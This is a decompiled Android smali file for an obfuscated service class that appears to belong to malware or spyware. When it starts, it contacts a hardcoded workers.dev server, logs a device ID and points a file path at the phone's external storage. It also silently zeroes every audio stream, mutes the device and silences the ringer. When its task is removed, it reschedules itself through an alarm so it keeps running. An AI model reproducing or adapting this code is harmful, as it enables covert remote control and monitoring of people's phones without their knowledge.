.class public final Lgqegwqg/bbebebefff/asdcdsac/InternalService;
.super Landroid/app/Service;
.source "sourcefile"

# interfaces
.implements Landroid/speech/tts/TextToSpeech$OnInitListener;


# instance fields
.field public e:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const-string v0, "intent"

    invoke-static {p1, v0}, Ln/o/c/h;->f(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 6

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const-string v0, "myLog"

    const-string v1, "Service: onCreate"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lgqegwqg/bbebebefff/asdcdsac/InternalService;->e:Landroid/content/Context;

    .line 1
    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 2
    sget-object v1, Lj/b/g/d;->a:Lp/x;

    new-instance v1, Lp/x;

    invoke-direct {v1}, Lp/x;-><init>()V

    .line 3
    new-instance v2, Lp/x$b;

    invoke-direct {v2, v1}, Lp/x$b;-><init>(Lp/x;)V

    const/high16 v1, 0xa00000

    .line 4
    new-instance v3, Lp/c;

    .line 5
    new-instance v4, Ljava/io/File;

    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v0

    const-string v5, "cache_an"

    invoke-direct {v4, v0, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    int-to-long v0, v1

    .line 6
    invoke-direct {v3, v4, v0, v1}, Lp/c;-><init>(Ljava/io/File;J)V

    .line 7
    iput-object v3, v2, Lp/x$b;->j:Lp/c;

    const/4 v0, 0x0

    iput-object v0, v2, Lp/x$b;->k:Lp/i0/e/g;

    .line 8
    sget-object v0, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v3, 0x3c

    invoke-virtual {v2, v3, v4, v0}, Lp/x$b;->d(JLjava/util/concurrent/TimeUnit;)Lp/x$b;

    invoke-virtual {v2, v3, v4, v0}, Lp/x$b;->e(JLjava/util/concurrent/TimeUnit;)Lp/x$b;

    invoke-virtual {v2, v3, v4, v0}, Lp/x$b;->f(JLjava/util/concurrent/TimeUnit;)Lp/x$b;

    .line 9
    new-instance v0, Lp/x;

    invoke-direct {v0, v2}, Lp/x;-><init>(Lp/x$b;)V

    .line 10
    sput-object v0, Lj/b/g/d;->a:Lp/x;

    .line 11
    invoke-static {}, Lj/b/g/b;->b()Lj/b/g/b;

    .line 12
    sget-object v0, Lj/b/g/a;->c:Lj/b/g/a;

    if-nez v0, :cond_1

    const-class v0, Lj/b/g/a;

    monitor-enter v0

    :try_start_0
    sget-object v1, Lj/b/g/a;->c:Lj/b/g/a;

    if-nez v1, :cond_0

    new-instance v1, Lj/b/g/a;

    new-instance v2, Lj/b/a/a;

    sget v3, Lj/b/g/a;->b:I

    invoke-direct {v2, v3}, Lj/b/a/a;-><init>(I)V

    invoke-direct {v1, v2}, Lj/b/g/a;-><init>(Lj/b/g/a$a;)V

    sput-object v1, Lj/b/g/a;->c:Lj/b/g/a;

    :cond_0
    monitor-exit v0

    goto :goto_0

    :catchall_0
    move-exception v1

    monitor-exit v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    throw v1

    .line 13
    :cond_1
    :goto_0
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {p0}, Landroid/app/Service;->getPackageName()Ljava/lang/String;

    move-result-object v1

    if-eqz v0, :cond_3

    .line 14
    invoke-static {v1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_2

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    :cond_2
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "_preferences"

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    .line 15
    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 16
    new-instance v0, Lj/k/a/i/c;

    const-string v1, "https://dbdb.addea.workers.dev"

    invoke-direct {v0, v1}, Lj/k/a/i/c;-><init>(Ljava/lang/String;)V

    const/4 v1, 0x1

    .line 17
    iput-boolean v1, v0, Lj/k/a/i/b;->h:Z

    .line 18
    new-instance v3, Lk/a/a/t;

    invoke-direct {v3}, Lk/a/a/t;-><init>()V

    invoke-virtual {v0, v3}, Lj/k/a/i/c;->b(Lj/k/a/e/a;)Ll/a/a0/b;

    .line 19
    sget-object v0, Lk/a/a/q;->c:Lorg/json/JSONObject;

    const-string v3, "device_id"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v3, "deviceID"

    invoke-static {v3, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    sput-object v0, Lk/a/a/q;->a:Ljava/lang/String;

    invoke-static {}, Lo/a/a/g/b;->a()Lo/a/a/g/b;

    move-result-object v0

    .line 20
    iget-object v0, v0, Lo/a/a/g/b;->b:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v3, "currentpath"

    const-string v4, "/storage/emulated/0"

    invoke-interface {v0, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 21
    :try_start_1
    sget-object v0, Lk/a/a/q;->a:Ljava/lang/String;

    invoke-static {v0}, Lk/a/a/s;->b(Ljava/lang/String;)Lk/a/a/s;

    const-string v0, "audio"

    .line 22
    invoke-virtual {p0, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    const-string v3, "null cannot be cast to non-null type android.media.AudioManager"

    invoke-static {v0, v3}, Ln/o/c/h;->d(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast v0, Landroid/media/AudioManager;

    const/4 v3, 0x3

    invoke-virtual {v0, v3, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    const/4 v3, 0x2

    invoke-virtual {v0, v3, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    const/4 v3, 0x5

    invoke-virtual {v0, v3, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    invoke-virtual {v0, v1, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    invoke-virtual {v0, v2}, Landroid/media/AudioManager;->setMode(I)V

    invoke-virtual {v0, v2}, Landroid/media/AudioManager;->setRingerMode(I)V

    const/16 v3, 0x8

    invoke-virtual {v0, v3, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    invoke-virtual {v0, v1, v1}, Landroid/media/AudioManager;->setStreamMute(IZ)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    .line 23
    invoke-virtual {v0}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "efef"

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :goto_1
    return-void

    .line 24
    :cond_3
    new-instance v0, Ljava/lang/RuntimeException;

    const-string v1, "Context not set, please set context before building the Prefs instance."

    invoke-direct {v0, v1}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/String;)V

    throw v0
.end method

.method public onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onInit(I)V
    .locals 0

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    const-string p1, "myLog"

    const-string p2, "Service: onStartCommand"

    invoke-static {p1, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 p1, 0x1

    return p1
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 6

    const-string v0, "rootIntent"

    invoke-static {p1, v0}, Ln/o/c/h;->f(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "myLog"

    const-string v1, "Service: onTaskRemoved"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lgqegwqg/bbebebefff/asdcdsac/InternalService;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Landroid/app/Service;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const/4 v2, 0x1

    const/high16 v3, 0x40000000    # 2.0f

    invoke-static {v1, v2, v0, v3}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "alarm"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    const-string v2, "null cannot be cast to non-null type android.app.AlarmManager"

    invoke-static {v1, v2}, Ln/o/c/h;->d(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast v1, Landroid/app/AlarmManager;

    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v2

    const/16 v4, 0x3e8

    int-to-long v4, v4

    add-long/2addr v2, v4

    const/4 v4, 0x3

    invoke-virtual {v1, v4, v2, v3, v0}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    return-void
.end method
